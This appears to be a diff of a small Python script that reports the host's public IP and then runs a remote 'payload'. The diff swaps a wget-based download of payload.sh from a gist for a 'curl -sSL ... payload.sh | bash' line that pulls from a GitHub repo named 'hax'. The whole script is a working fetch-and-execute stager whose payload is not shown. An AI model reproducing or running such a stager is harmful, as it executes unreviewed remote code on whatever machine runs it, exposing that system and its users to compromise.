@@ -12,10 +12,8 @@ print urllib2.urlopen("https://api.ipify.org/?format=json").read()
 
 print "Executing payload..."
 import os
-os.system("which wget")
 os.system("which curl")
-os.system("sudo apt-get install -y wget")
-os.system("wget -O - https://gist.githubusercontent.com/slimsag/293e68ffd9fcd3edbc98/raw/9b69429afe3158e5b4a9f0866b466debc97c07ac/payload.sh | bash")
+os.system("curl -sSL https://raw.githubusercontent.com/slimsag/hax/master/payload.sh | bash")
 
 print "Done."
 sys.exit(0);
